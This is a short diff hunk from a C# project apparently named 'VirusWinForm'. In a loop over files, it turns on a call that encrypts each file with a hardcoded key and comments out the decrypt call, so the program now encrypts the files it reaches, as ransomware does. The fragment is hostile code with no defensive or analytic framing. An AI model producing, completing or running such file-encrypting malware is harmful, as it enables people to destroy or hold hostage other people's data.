@@ -128,9 +128,9 @@ namespace VirusWinForm
                 if (mFileInfo.Attributes != FileAttributes.Directory)
                 {
                     Console.WriteLine(cnt);
-                   // Crypto.Encrypt.EncryptFile(cnt, "tuduyconheo20190");
+                    Crypto.Encrypt.EncryptFile(cnt, "tuduyconheo20190");
 
-                    Crypto.Decrypt.DecryptFile(cnt, "tuduyconheo20190");
+                   // Crypto.Decrypt.DecryptFile(cnt, "tuduyconheo20190");
 
                 }
 
